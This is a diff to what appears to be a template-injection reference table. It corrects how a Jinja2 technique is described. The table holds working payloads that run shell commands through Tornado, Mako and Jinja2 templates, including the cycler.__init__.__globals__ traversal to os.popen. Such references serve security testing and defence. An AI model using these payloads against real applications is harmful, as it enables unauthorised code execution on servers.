@@ -68,7 +68,7 @@ Some engines allow importing modules or packages within template code, enabling 
 |---|---|---|---|
 | **Python import in template** | Tornado (Python) | `{% import module %}` within template blocks | `{% import os %}{{ os.popen('id').read() }}` |
 | **Mako module import** | Mako (Python) | `<%! %>` for module-level blocks, `<% %>` for in-line | `<% import subprocess; x=subprocess.check_output('id',shell=True) %>${x}` |
-| **Jinja2 namespace import** | Jinja2 (Python) | When extensions like `jinja2.ext.do` are loaded | `{% set x = cycler.__init__.__globals__.os.popen('id').read() %}` |
+| **Jinja2 globals traversal** | Jinja2 (Python) | Built-in objects (`cycler`, `joiner`, `namespace`, `lipsum`) expose `__init__.__globals__` — no extensions required | `{% set x = cycler.__init__.__globals__.os.popen('id').read() %}` |
 
 ### §1-3. File Operation Primitives
 
